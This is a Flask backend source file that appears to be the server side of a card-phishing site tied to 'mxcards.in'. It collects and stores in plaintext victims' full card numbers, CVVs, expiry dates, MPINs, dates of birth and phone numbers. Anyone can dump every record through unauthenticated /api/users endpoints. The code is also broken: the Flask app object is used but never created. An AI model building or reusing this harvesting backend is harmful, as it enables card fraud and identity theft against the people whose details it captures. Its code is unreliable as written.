from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from datetime import datetime
import os

CORS(app, supports_credentials=True, origins=[
    "http://localhost:5174",
    "http://127.0.0.1:5174",
    "https://mxcards.in"
])

# Configure database
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'sqlite:///user_data.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# User Model (no change needed)
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    dob = db.Column(db.String(20), nullable=False)
    phone = db.Column(db.String(15), nullable=False)
    mpin = db.Column(db.String(6))
    credit_limit = db.Column(db.Integer)
    card_number = db.Column(db.String(16))
    card_holder_name = db.Column(db.String(100))
    expiry_date = db.Column(db.String(10))
    cvv = db.Column(db.String(4))
    submission_date = db.Column(db.DateTime, default=datetime.utcnow)

    def to_dict(self):
        return {
            'id': self.id,
            'name': self.name,
            'dob': self.dob,
            'phone': self.phone,
            'mpin': self.mpin,
            'credit_limit': self.credit_limit,
            'card_number': self.card_number,
            'card_holder_name': self.card_holder_name,
            'expiry_date': self.expiry_date,
            'cvv': self.cvv,
            'submission_date': self.submission_date.isoformat()
        }

with app.app_context():
    db.create_all()
@app.route('/api/submit', methods=['POST'])
def submit_form():
    print("Request received at /api/submit")
    # Existing code
    

    if request.method == "OPTIONS":
        return jsonify({'message': 'CORS preflight OK'}), 200

    try:
        data = request.json
        new_user = User(
            name=data.get('name'),
            dob=data.get('dob'),
            phone=data.get('phone'),
            mpin=data.get('mpin'),
            credit_limit=data.get('creditLimit'),
            card_number=data.get('cardNumber'),
            card_holder_name=data.get('cardHolderName'),
            expiry_date=data.get('expiryDate'),
            cvv=data.get('cvv')
        )
        db.session.add(new_user)
        db.session.commit()
        return jsonify({'success': True, 'message': 'Data saved successfully'}), 201
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/users', methods=['GET'])
def get_users():
    try:
        users = User.query.order_by(User.submission_date.desc()).all()
        return jsonify([user.to_dict() for user in users]), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/users/<int:user_id>', methods=['GET'])
def get_user(user_id):
    try:
        user = User.query.get_or_404(user_id)
        return jsonify(user.to_dict()), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 404

if __name__ == '__main__':
    app.run(debug=True)
